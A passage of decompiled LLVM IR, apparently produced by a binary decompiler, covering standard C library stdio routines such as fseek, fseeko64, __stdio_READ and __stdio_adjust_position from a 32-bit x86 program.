  store i16 %v1_8066473, i16* %v4_8066473, align 2
  %v0_8066477 = load i32, i32* %eax.global-to-local, align 4
  %v0_806647a = load i32, i32* @ebx, align 4
  %v1_806647a = inttoptr i32 %v0_806647a to i32*
  %v2_806647a = load i32, i32* %v1_806647a, align 4
  store i32 %v2_806647a, i32* %eax.global-to-local, align 4
  %v0_806647c = load i32, i32* %edx.global-to-local, align 4
  %v1_806647f = add i32 %v0_806647a, 4
  %v2_806647f = inttoptr i32 %v1_806647f to i32*
  %v3_806647f = load i32, i32* %v2_806647f, align 4
  store i32 %v3_806647f, i32* %edx.global-to-local, align 4
  %v1_8066482 = load i32, i32* @esi, align 4
  %v2_8066482 = inttoptr i32 %v1_8066482 to i32*
  store i32 %v2_806647a, i32* %v2_8066482, align 4
  store i32 %v0_8066477, i32* %eax.global-to-local, align 4
  %v0_8066487 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066487 = load i32, i32* @esi, align 4
  %v2_8066487 = add i32 %v1_8066487, 4
  %v3_8066487 = inttoptr i32 %v2_8066487 to i32*
  store i32 %v0_8066487, i32* %v3_8066487, align 4
  store i32 %v0_806647c, i32* %edx.global-to-local, align 4
  %v0_806648d = load i32, i32* %eax.global-to-local, align 4
  %v1_806648d = load i32, i32* @esi, align 4
  %v2_806648d = add i32 %v1_806648d, 8
  %v3_806648d = inttoptr i32 %v2_806648d to i32*
  store i32 %v0_806648d, i32* %v3_806648d, align 4
  %v0_8066490 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066490 = load i32, i32* @esi, align 4
  %v2_8066490 = add i32 %v1_8066490, 12
  %v3_8066490 = inttoptr i32 %v2_8066490 to i32*
  store i32 %v0_8066490, i32* %v3_8066490, align 4
  %v0_8066493 = load i32, i32* @ebx, align 4
  %v1_8066493 = add i32 %v0_8066493, 18
  %v2_8066493 = inttoptr i32 %v1_8066493 to i8*
  %v3_8066493 = load i8, i8* %v2_8066493, align 1
  %v4_8066493 = zext i8 %v3_8066493 to i32
  %v5_8066493 = load i32, i32* %eax.global-to-local, align 4
  %v6_8066493 = and i32 %v5_8066493, -256
  %v7_8066493 = or i32 %v6_8066493, %v4_8066493
  store i32 %v7_8066493, i32* %eax.global-to-local, align 4
  %v2_8066496 = load i32, i32* @esi, align 4
  %v3_8066496 = add i32 %v2_8066496, 18
  %v4_8066496 = inttoptr i32 %v3_8066496 to i8*
  store i8 %v3_8066493, i8* %v4_8066496, align 1
  %v0_8066499 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066499 = load i32, i32* @esp, align 4
  %v2_8066499 = add i32 %v1_8066499, -4
  %v3_8066499 = inttoptr i32 %v2_8066499 to i32*
  store i32 %v0_8066499, i32* %v3_8066499, align 4
  %v0_806649a = load i32, i32* @edi, align 4
  %v1_806649a = add i32 %v0_806649a, -19
  %v2_806649d = add i32 %v1_8066499, -8
  %v3_806649d = inttoptr i32 %v2_806649d to i32*
  store i32 %v1_806649a, i32* %v3_806649d, align 4
  %v0_806649e = load i32, i32* @ebx, align 4
  %v1_806649e = add i32 %v0_806649e, 19
  %v2_80664a1 = add i32 %v1_8066499, -12
  %v3_80664a1 = inttoptr i32 %v2_80664a1 to i32*
  store i32 %v1_806649e, i32* %v3_80664a1, align 4
  %v0_80664a2 = load i32, i32* @esi, align 4
  %v1_80664a2 = add i32 %v0_80664a2, 19
  store i32 %v1_80664a2, i32* %eax.global-to-local, align 4
  %v2_80664a5 = add i32 %v1_8066499, -16
  %v3_80664a5 = inttoptr i32 %v2_80664a5 to i32*
  store i32 %v1_80664a2, i32* %v3_80664a5, align 4
  %v3_80664a6 = inttoptr i32 %v2_806643a to i8*
  %v4_80664a6 = call i32 @memcpy(i8* %v3_80664a6, i32 %v0_8066477, i32 %v0_806647c)
  store i32 %v4_80664a6, i32* %eax.global-to-local, align 4
  %v0_80664ab = load i32, i32* @ebx, align 4
  %v1_80664ab = add i32 %v0_80664ab, 16
  %v2_80664ab = inttoptr i32 %v1_80664ab to i16*
  %v3_80664ab = load i16, i16* %v2_80664ab, align 2
  %v4_80664ab = zext i16 %v3_80664ab to i32
  store i32 %v4_80664ab, i32* %eax.global-to-local, align 4
  %v0_80664af = load i32, i32* @esp, align 4
  %v1_80664af = add i32 %v0_80664af, 16
  store i32 %v2_806643a, i32* @esi, align 4
  %v2_80664b5 = add i32 %v4_80664ab, %v0_80664ab
  store i32 %v2_80664b5, i32* @ebx, align 4
  %v10_80664b7 = icmp ult i32 %v2_80664b5, %v3_8066420
  br i1 %v10_80664b7, label %dec_label_pc_806642d, label %dec_label_pc_80664c0

dec_label_pc_80664c0:                             ; preds = %dec_label_pc_8066408, %dec_label_pc_806646d, %dec_label_pc_8066444
  %v0_80664c0 = phi i32 [ %v0_8066457, %dec_label_pc_8066444 ], [ %tmp15, %dec_label_pc_8066408 ], [ %v2_806643a, %dec_label_pc_806646d ]
  %v5_80664c2 = sub i32 %v0_80664c0, %tmp15
  store i32 %v5_80664c2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80664c5

dec_label_pc_80664c5:                             ; preds = %dec_label_pc_80663fb, %dec_label_pc_8066468, %dec_label_pc_80664c0
  %v0_80664cc = phi i32 [ -1, %dec_label_pc_80663fb ], [ -1, %dec_label_pc_8066468 ], [ %v5_80664c2, %dec_label_pc_80664c0 ]
  store i32 %v0_80663b8, i32* @esi, align 4
  store i32 %v0_80663b7, i32* @edi, align 4
  ret i32 %v0_80664cc

; uselistorder directives
  uselistorder i32 %v2_80664b5, { 1, 2, 0 }
  uselistorder i32 %v0_806647c, { 1, 2, 0 }
  uselistorder i32 %v0_8066477, { 1, 2, 0 }
  uselistorder i32 %v0_8066457, { 1, 0 }
  uselistorder i32 %v2_806643a, { 1, 5, 4, 3, 0, 6, 2 }
  uselistorder i32 %v1_8066437, { 1, 0 }
  uselistorder i32 %v0_806644438, { 3, 2, 1, 0 }
  uselistorder i32 %v0_806646d40, { 1, 2, 0 }
  uselistorder i32 %v3_8066420, { 1, 0, 2 }
  uselistorder i32 %v5_80663dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80663d1, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %tmp15, { 5, 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 0, 20, 21, 22 }
  uselistorder i32 19, { 2, 3, 1, 4, 0 }
  uselistorder i32 -19, { 1, 0 }
  uselistorder i32 18, { 3, 4, 2, 1, 0 }
  uselistorder i32 220, { 1, 0 }
  uselistorder i32 30, { 7, 1, 8, 6, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80664c5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80664c0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8066468, { 1, 0 }
  uselistorder label %dec_label_pc_806642d, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80664db = ashr i32 %arg2, 31
  %v4_80664e2 = call i32 @__GI_fseeko64(i32 %arg1, i32 %arg2, i32 %v1_80664db, i32 %arg3)
  ret i32 %v4_80664e2
}

define i32 @__GI_fseeko64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %v0_80664ec = load i32, i32* @edi, align 4
  %v0_80664ed = load i32, i32* @esi, align 4
  %v0_80664ee = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_806651b, label %dec_label_pc_8066507

dec_label_pc_8066507:                             ; preds = %entry
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  %v3_8066516 = call i32 @function_80665ea(i32 %v0_80664ee, i32 %v0_80664ed, i32 %v0_80664ec)
  store i32 %v3_8066516, i32* %eax.global-to-local, align 4
  %v0_806651b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806651b

dec_label_pc_806651b:                             ; preds = %entry, %dec_label_pc_8066507
  %v0_806651b = phi i32 [ %arg1, %entry ], [ %v0_806651b.pre, %dec_label_pc_8066507 ]
  %v1_806651b = add i32 %v0_806651b, 52
  %v2_806651b = inttoptr i32 %v1_806651b to i32*
  %v3_806651b = load i32, i32* %v2_806651b, align 4
  store i32 %v3_806651b, i32* @esi, align 4
  %v1_8066526 = icmp eq i32 %v3_806651b, 0
  %v1_8066528 = icmp eq i1 %v1_8066526, false
  call void @__pseudo_cond_branch(i1 %v1_8066528, i32 134636888)
  %v0_806652a = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_8066531 = load i32, i32* @ebx, align 4
  %v1_8066531 = add i32 %v0_8066531, 64
  %v2_8066531 = inttoptr i32 %v1_8066531 to i32*
  %v3_8066531 = load i32, i32* %v2_8066531, align 4
  %v15_8066531 = icmp eq i32 %v3_8066531, %v0_806652a
  call void @__pseudo_cond_branch(i1 %v15_8066531, i32 134636885)
  store i32 1, i32* %ecx.global-to-local, align 4
  store i32 %v3_806651b, i32* %eax.global-to-local, align 4
  %v0_806653d = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_806653d = icmp eq i32 %v0_806653d, 0
  call void @__pseudo_cond_branch(i1 %v1_806653d, i32 134636872)
  %v0_8066547 = load i32, i32* @ebx, align 4
  %v1_8066547 = add i32 %v0_8066547, 56
  %v2_8066547 = inttoptr i32 %v1_8066547 to i32*
  %v3_8066547 = load i32, i32* %v2_8066547, align 4
  %v4_8066547 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8066547 = load i32, i32* %eax.global-to-local, align 4
  %v16_8066547 = icmp eq i32 %v5_8066547, %v3_8066547
  %v23_8066547 = select i1 %v16_8066547, i32 %v4_8066547, i32 %v3_8066547
  store i32 %v23_8066547, i32* %v2_8066547, align 4
  store i32 %v3_8066547, i32* %eax.global-to-local, align 4
  %v1_806654c = icmp eq i1 %v16_8066547, false
  call void @__pseudo_cond_branch(i1 %v1_806654c, i32 134637043)
  ret i32 %v3_8066547

; uselistorder directives
  uselistorder i1 %v16_8066547, { 1, 0 }
  uselistorder i32 %v3_8066547, { 1, 0, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 10, 0, 7, 6, 8, 2, 9, 3, 4, 5, 13, 1, 11, 12 }
  uselistorder label %dec_label_pc_806651b, { 1, 0 }
}

define i32 @function_8066552() local_unnamed_addr {
dec_label_pc_8066552:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_8 = alloca i32, align 4
  %v0_8066552 = load i32, i32* @edx, align 4
  %v1_8066552 = load i32, i32* @ebx, align 4
  %v2_8066552 = add i32 %v1_8066552, 64
  %v3_8066552 = inttoptr i32 %v2_8066552 to i32*
  store i32 %v0_8066552, i32* %v3_8066552, align 4
  %v0_8066555 = load i32, i32* @ebx, align 4
  %v1_8066555 = add i32 %v0_8066555, 60
  %v2_8066555 = inttoptr i32 %v1_8066555 to i32*
  %v3_8066555 = load i32, i32* %v2_8066555, align 4
  %v4_8066555 = add i32 %v3_8066555, 1
  store i32 %v4_8066555, i32* %v2_8066555, align 4
  %v0_8066558 = load i32, i32* @ebx, align 4
  %v1_8066558 = inttoptr i32 %v0_8066558 to i8*
  %v2_8066558 = load i8, i8* %v1_8066558, align 1
  %v3_8066558 = and i8 %v2_8066558, 64
  %v4_8066558 = icmp eq i8 %v3_8066558, 0
  br i1 %v4_8066558, label %dec_label_pc_806656d, label %dec_label_pc_806655d

dec_label_pc_806655d:                             ; preds = %dec_label_pc_8066552
  %v1_8066561 = call i32 @__stdio_wcommit(i32 %v0_8066558)
  store i32 %v1_8066561, i32* @eax, align 4
  %v1_8066569 = icmp eq i32 %v1_8066561, 0
  %v1_806656b = icmp eq i1 %v1_8066569, false
  br i1 %v1_806656b, label %dec_label_pc_80665c0, label %dec_label_pc_806656d

dec_label_pc_806656d:                             ; preds = %dec_label_pc_806655d, %dec_label_pc_8066552
  %v0_806656d = load i32, i32* @edi, align 4
  %v9_806656d = icmp eq i32 %v0_806656d, 1
  %v1_8066570 = icmp eq i1 %v9_806656d, false
  br i1 %v1_8066570, label %dec_label_pc_806656d.dec_label_pc_8066586_crit_edge, label %dec_label_pc_8066572

dec_label_pc_806656d.dec_label_pc_8066586_crit_edge: ; preds = %dec_label_pc_806656d
  %v0_8066586.pre = load i32, i32* @eax, align 4
  %.pre4 = ptrtoint i32* %stack_var_8 to i32
  br label %dec_label_pc_8066586

dec_label_pc_8066572:                             ; preds = %dec_label_pc_806656d
  %v0_8066572 = load i32, i32* @edx, align 4
  %v2_8066574 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_8066574, i32* %eax.global-to-local, align 4
  %v0_8066579 = load i32, i32* @ebx, align 4
  %v4_806657a = inttoptr i32 %v0_8066579 to i16*
  %v5_806657a = call i32 @__stdio_adjust_position(i16* %v4_806657a, i32 %v2_8066574, i32 %v0_8066572, i32 %v0_8066572)
  store i32 %v5_806657a, i32* %eax.global-to-local, align 4
  %v2_8066582 = icmp slt i32 %v5_806657a, 0
  br i1 %v2_8066582, label %dec_label_pc_80665c0, label %dec_label_pc_8066572.dec_label_pc_8066586_crit_edge

dec_label_pc_8066572.dec_label_pc_8066586_crit_edge: ; preds = %dec_label_pc_8066572
  %v0_8066587.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8066586

dec_label_pc_8066586:                             ; preds = %dec_label_pc_8066572.dec_label_pc_8066586_crit_edge, %dec_label_pc_806656d.dec_label_pc_8066586_crit_edge
  %v2_8066588.pre-phi = phi i32 [ %v2_8066574, %dec_label_pc_8066572.dec_label_pc_8066586_crit_edge ], [ %.pre4, %dec_label_pc_806656d.dec_label_pc_8066586_crit_edge ]
  %v0_8066587 = phi i32 [ %v0_8066587.pre, %dec_label_pc_8066572.dec_label_pc_8066586_crit_edge ], [ %v0_806656d, %dec_label_pc_806656d.dec_label_pc_8066586_crit_edge ]
  %v0_8066586 = phi i32 [ %v5_806657a, %dec_label_pc_8066572.dec_label_pc_8066586_crit_edge ], [ %v0_8066586.pre, %dec_label_pc_806656d.dec_label_pc_8066586_crit_edge ]
  store i32 %v2_8066588.pre-phi, i32* %eax.global-to-local, align 4
  %v0_806658d = load i32, i32* @ebx, align 4
  %v4_806658e = inttoptr i32 %v2_8066588.pre-phi to i32*
  %v5_806658e = call i32 @__stdio_seek(i32 %v0_806658d, i32* %v4_806658e, i32 %v0_8066587, i32 %v0_8066586)
  store i32 %v5_806658e, i32* %eax.global-to-local, align 4
  %v2_8066596 = icmp slt i32 %v5_806658e, 0
  br i1 %v2_8066596, label %dec_label_pc_80665c0, label %dec_label_pc_806659a

dec_label_pc_806659a:                             ; preds = %dec_label_pc_8066586
  %v0_806659a = load i32, i32* @ebx, align 4
  %v1_806659a = inttoptr i32 %v0_806659a to i32*
  %v2_806659a = load i32, i32* %v1_806659a, align 4
  store i32 %v2_806659a, i32* %eax.global-to-local, align 4
  %v1_806659e = add i32 %v0_806659a, 44
  %v2_806659e = inttoptr i32 %v1_806659e to i32*
  store i32 0, i32* %v2_806659e, align 4
  %v0_80665a5 = load i32, i32* @ebx, align 4
  %v1_80665a5 = add i32 %v0_80665a5, 2
  %v2_80665a5 = inttoptr i32 %v1_80665a5 to i8*
  store i8 0, i8* %v2_80665a5, align 1
  %v0_80665a9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80665a9 = and i32 %v0_80665a9, -72
  store i32 %v1_80665a9, i32* %eax.global-to-local, align 4
  %v1_80665ac = trunc i32 %v1_80665a9 to i16
  %v2_80665ac = load i32, i32* @ebx, align 4
  %v3_80665ac = inttoptr i32 %v2_80665ac to i16*
  store i16 %v1_80665ac, i16* %v3_80665ac, align 2
  %v0_80665af = load i32, i32* @ebx, align 4
  %v1_80665af = add i32 %v0_80665af, 8
  %v2_80665af = inttoptr i32 %v1_80665af to i32*
  %v3_80665af = load i32, i32* %v2_80665af, align 4
  store i32 %v3_80665af, i32* %eax.global-to-local, align 4
  %v2_80665b2 = add i32 %v0_80665af, 16
  %v3_80665b2 = inttoptr i32 %v2_80665b2 to i32*
  store i32 %v3_80665af, i32* %v3_80665b2, align 4
  %v0_80665b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80665b5 = load i32, i32* @ebx, align 4
  %v2_80665b5 = add i32 %v1_80665b5, 20
  %v3_80665b5 = inttoptr i32 %v2_80665b5 to i32*
  store i32 %v0_80665b5, i32* %v3_80665b5, align 4
  %v0_80665b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80665b8 = load i32, i32* @ebx, align 4
  %v2_80665b8 = add i32 %v1_80665b8, 24
  %v3_80665b8 = inttoptr i32 %v2_80665b8 to i32*
  store i32 %v0_80665b8, i32* %v3_80665b8, align 4
  %v0_80665bb = load i32, i32* %eax.global-to-local, align 4
  %v1_80665bb = load i32, i32* @ebx, align 4
  %v2_80665bb = add i32 %v1_80665bb, 28
  %v3_80665bb = inttoptr i32 %v2_80665bb to i32*
  store i32 %v0_80665bb, i32* %v3_80665bb, align 4
  br label %dec_label_pc_80665c3

dec_label_pc_80665c0:                             ; preds = %dec_label_pc_8066586, %dec_label_pc_8066572, %dec_label_pc_806655d
  br label %dec_label_pc_80665c3

dec_label_pc_80665c3:                             ; preds = %dec_label_pc_806659a, %dec_label_pc_80665c0
  %v0_80665c3 = load i32, i32* @esi, align 4
  %v1_80665c3 = icmp eq i32 %v0_80665c3, 0
  %v1_80665c5 = icmp eq i1 %v1_80665c3, false
  call void @__pseudo_cond_branch(i1 %v1_80665c5, i32 134637034)
  %v0_80665c7 = load i32, i32* @ebx, align 4
  %v1_80665c7 = add i32 %v0_80665c7, 60
  %v2_80665c7 = inttoptr i32 %v1_80665c7 to i32*
  %v3_80665c7 = load i32, i32* %v2_80665c7, align 4
  %v1_80665ca = add i32 %v3_80665c7, -1
  %v8_80665ca = icmp eq i32 %v1_80665ca, 0
  store i32 %v1_80665ca, i32* %eax.global-to-local, align 4
  store i32 %v1_80665ca, i32* %v2_80665c7, align 4
  %v1_80665d0 = icmp eq i1 %v8_80665ca, false
  call void @__pseudo_cond_branch(i1 %v1_80665d0, i32 134637034)
  %v0_80665d2 = load i32, i32* @ebx, align 4
  %v1_80665d2 = add i32 %v0_80665d2, 64
  %v2_80665d2 = inttoptr i32 %v1_80665d2 to i32*
  store i32 0, i32* %v2_80665d2, align 4
  %v0_80665d9 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80665d9 = icmp eq i32 %v0_80665d9, 0
  call void @__pseudo_cond_branch(i1 %v1_80665d9, i32 134637028)
  %v0_80665e3 = load i32, i32* @ebx, align 4
  %v1_80665e3 = add i32 %v0_80665e3, 56
  %v2_80665e3 = inttoptr i32 %v1_80665e3 to i32*
  %v3_80665e3 = load i32, i32* %v2_80665e3, align 4
  %v4_80665e3 = add i32 %v3_80665e3, -1
  %v12_80665e3 = icmp eq i32 %v4_80665e3, 0
  store i32 %v4_80665e3, i32* %v2_80665e3, align 4
  %v1_80665e8 = icmp eq i1 %v12_80665e3, false
  call void @__pseudo_cond_branch(i1 %v1_80665e8, i32 134637056)
  ret i32 %v1_80665ca

; uselistorder directives
  uselistorder i32 %v4_80665e3, { 1, 0 }
  uselistorder i32 %v1_80665ca, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8066588.pre-phi, { 1, 0 }
  uselistorder i32 %v0_806656d, { 1, 0 }
  uselistorder i32* %stack_var_8, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 111, 112, 113, 114, 115, 116, 117, 118, 73, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 87, 88, 89, 90, 91, 92, 93, 94, 24, 25, 26, 27, 28, 29, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 134, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 138, 139, 140, 141, 142, 143, 144, 127, 128, 129, 135, 136, 137, 146, 147, 148, 130, 131, 132, 0, 1, 2, 3, 18, 19, 20, 21, 22, 23, 133, 119, 120, 121, 122, 123, 124, 125, 126, 145 }
  uselistorder i8 64, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_80665c3, { 1, 0 }
}

define i32 @function_80665ea(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80665ea:
  %v0_80665ed = load i32, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg3, i32* @edi, align 4
  ret i32 %v0_80665ed
}

define i32 @_L_lock_34() local_unnamed_addr {
entry:
  %v0_80665f3 = load i32, i32* @ebx, align 4
  %v1_80665f3 = add i32 %v0_80665f3, 56
  store i32 %v1_80665f3, i32* @ecx, align 4
  %v0_80665f6 = call i32 @__lll_lock_wait_private()
  store i32 %v0_80665f6, i32* @eax, align 4
  %v0_80665fb = call i32 @function_8066552()
  ret i32 %v0_80665fb

; uselistorder directives
  uselistorder i32 ()* @__lll_lock_wait_private, { 2, 10, 9, 8, 7, 6, 5, 14, 4, 3, 13, 12, 11, 18, 17, 16, 0, 19, 15, 1 }
}

define i32 @_L_unlock_108() local_unnamed_addr {
entry:
  %v0_8066600 = load i32, i32* @ebx, align 4
  %v1_8066600 = add i32 %v0_8066600, 56
  store i32 %v1_8066600, i32* @eax, align 4
  %v0_8066603 = call i32 @__lll_unlock_wake_private()
  %v3_8066608 = call i32 @function_80665ea(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  ret i32 %v3_8066608

; uselistorder directives
  uselistorder i32 ()* @__lll_unlock_wake_private, { 2, 10, 9, 8, 7, 6, 5, 14, 4, 3, 13, 12, 11, 18, 17, 16, 0, 19, 15, 1 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806660c = load i32, i32* @ebx, align 4
  store i32 %v0_806660c, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_8066612 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066612, i32* %ebx.global-to-local, align 4
  %v1_806661a = bitcast i16* %arg1 to i8*
  %v2_806661a = load i8, i8* %v1_806661a, align 1
  %v3_806661a = and i8 %v2_806661a, 4
  %v4_806661a = icmp eq i8 %v3_806661a, 0
  %v1_806661d = icmp eq i1 %v4_806661a, false
  br i1 %v1_806661d, label %dec_label_pc_8066655, label %dec_label_pc_806661f

dec_label_pc_806661f:                             ; preds = %entry
  %v2_806661f = icmp slt i32 %arg3, 0
  store i32 2147483647, i32* @eax, align 4
  %v3_8066626 = select i1 %v2_806661f, i32 2147483647, i32 %arg3
  %v1_806662f = add i32 %v4_8066612, 4
  %v2_806662f = inttoptr i32 %v1_806662f to i32*
  %v3_806662f = load i32, i32* %v2_806662f, align 4
  %v3_8066632 = call i32 @__libc_read(i32 %v3_806662f, i32 %arg2, i32 %v3_8066626)
  store i32 %v3_8066632, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v3_8066632, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_8066655, label %dec_label_pc_8066641

dec_label_pc_8066641:                             ; preds = %dec_label_pc_806661f
  %v1_806663a = icmp eq i32 %v3_8066632, 0
  %v4_806663f = icmp eq i1 %v1_806663a, false
  %v0_8066641 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066641 = inttoptr i32 %v0_8066641 to i32*
  %v2_8066641 = load i32, i32* %v1_8066641, align 4
  br i1 %v4_806663f, label %dec_label_pc_806664d, label %dec_label_pc_8066645

dec_label_pc_8066645:                             ; preds = %dec_label_pc_8066641
  %v1_8066645 = or i32 %v2_8066641, 4
  %v1_8066648 = trunc i32 %v1_8066645 to i16
  %v3_8066648 = inttoptr i32 %v0_8066641 to i16*
  store i16 %v1_8066648, i16* %v3_8066648, align 2
  br label %dec_label_pc_8066655

dec_label_pc_806664d:                             ; preds = %dec_label_pc_8066641
  %v1_806664d = or i32 %v2_8066641, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8066652 = trunc i32 %v1_806664d to i16
  %v3_8066652 = inttoptr i32 %v0_8066641 to i16*
  store i16 %v1_8066652, i16* %v3_8066652, align 2
  br label %dec_label_pc_8066655

dec_label_pc_8066655:                             ; preds = %dec_label_pc_806661f, %entry, %dec_label_pc_8066645, %dec_label_pc_806664d
  %v0_8066656 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8066659 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066659, i32* @ebx, align 4
  ret i32 %v0_8066656

; uselistorder directives
  uselistorder i32 %v3_8066632, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 4, 7, 0, 5, 1, 6, 2, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066655, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8066661 = load i32, i32* @ebx, align 4
  store i32 %v0_8066661, i32* %stack_var_-16, align 4
  %v4_8066662 = ptrtoint i16* %arg1 to i32
  %v2_8066666 = load i16, i16* %arg1, align 2
  %v3_8066666 = zext i16 %v2_8066666 to i32
  store i32 %v3_8066666, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8066666, 4
  %v2_806666b = icmp eq i16 %tmp, 0
  br i1 %v2_806666b, label %dec_label_pc_8066697, label %dec_label_pc_8066670

dec_label_pc_8066670:                             ; preds = %entry
  %v1_806666b = zext i16 %tmp to i32
  %v1_8066672 = add nsw i32 %v1_806666b, -1
  %v8_8066672 = icmp eq i32 %v1_8066672, 0
  store i32 %v1_8066672, i32* %edx.global-to-local, align 4
  br i1 %v8_8066672, label %dec_label_pc_8066697, label %dec_label_pc_8066675

dec_label_pc_8066675:                             ; preds = %dec_label_pc_8066670
  %v3_8066675 = and i32 %v3_8066666, 2048
  %v4_8066675 = icmp eq i32 %v3_8066675, 0
  br i1 %v4_8066675, label %dec_label_pc_8066697, label %dec_label_pc_806667a

dec_label_pc_806667a:                             ; preds = %dec_label_pc_8066675
  %v9_806667a = icmp eq i16 %tmp, 3
  br i1 %v9_806667a, label %dec_label_pc_80666e8, label %dec_label_pc_806667f

dec_label_pc_806667f:                             ; preds = %dec_label_pc_806667a
  %v1_806667f = add i32 %v4_8066662, 40
  %v2_806667f = inttoptr i32 %v1_806667f to i32*
  %v3_806667f = load i32, i32* %v2_806667f, align 4
  %v4_806667f = icmp eq i32 %v3_806667f, 0
  %v1_8066683 = icmp eq i1 %v4_806667f, false
  br i1 %v1_8066683, label %dec_label_pc_80666e8, label %dec_label_pc_8066685

dec_label_pc_8066685:                             ; preds = %dec_label_pc_806667f
  %v1_8066685 = add i32 %v4_8066662, 3
  %v2_8066685 = inttoptr i32 %v1_8066685 to i8*
  %v3_8066685 = load i8, i8* %v2_8066685, align 1
  %v4_8066685 = zext i8 %v3_8066685 to i32
  %v1_8066689 = sub nsw i32 0, %v4_8066685
  store i32 %v1_8066689, i32* %edx.global-to-local, align 4
  %v1_806668b = add i32 %v4_8066662, 44
  %v2_806668b = inttoptr i32 %v1_806668b to i32*
  %v3_806668b = load i32, i32* %v2_806668b, align 4
  %tmp9 = icmp slt i32 %v3_806668b, 1
  br i1 %tmp9, label %dec_label_pc_8066697, label %dec_label_pc_8066691

dec_label_pc_8066691:                             ; preds = %dec_label_pc_8066685
  %v1_8066691 = add i32 %v4_8066662, 2
  %v2_8066691 = inttoptr i32 %v1_8066691 to i8*
  %v3_8066691 = load i8, i8* %v2_8066691, align 1
  %v4_8066691 = zext i8 %v3_8066691 to i32
  %v2_8066695 = sub nsw i32 %v1_8066689, %v4_8066691
  store i32 %v2_8066695, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066697

dec_label_pc_8066697:                             ; preds = %dec_label_pc_8066685, %dec_label_pc_8066675, %dec_label_pc_8066670, %entry, %dec_label_pc_8066691
  %v0_80666a4 = phi i32 [ %v1_8066689, %dec_label_pc_8066685 ], [ %v1_8066672, %dec_label_pc_8066675 ], [ 0, %dec_label_pc_8066670 ], [ 0, %entry ], [ %v2_8066695, %dec_label_pc_8066691 ]
  %v2_8066697 = and i32 %v3_8066666, 64
